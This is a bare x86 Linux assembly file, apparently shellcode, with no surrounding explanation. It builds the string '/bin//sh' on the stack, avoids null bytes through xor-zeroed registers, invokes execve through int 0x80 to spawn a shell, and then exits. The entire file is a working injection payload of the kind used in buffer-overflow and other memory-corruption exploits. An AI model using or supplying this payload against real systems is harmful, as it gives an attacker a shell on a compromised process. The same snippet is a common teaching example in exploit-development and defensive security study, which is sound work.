global _start

section .text
_start:
        xor eax, eax
        push eax
        push 0x68732f2f ;//sh
        push 0x6e69622f ;/bin
        mov al, 11
        xor ebx, ebx
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80      ; execve

        xor eax, eax
        mov al, 1
        xor ebx, ebx
        int 0x80      ; exit
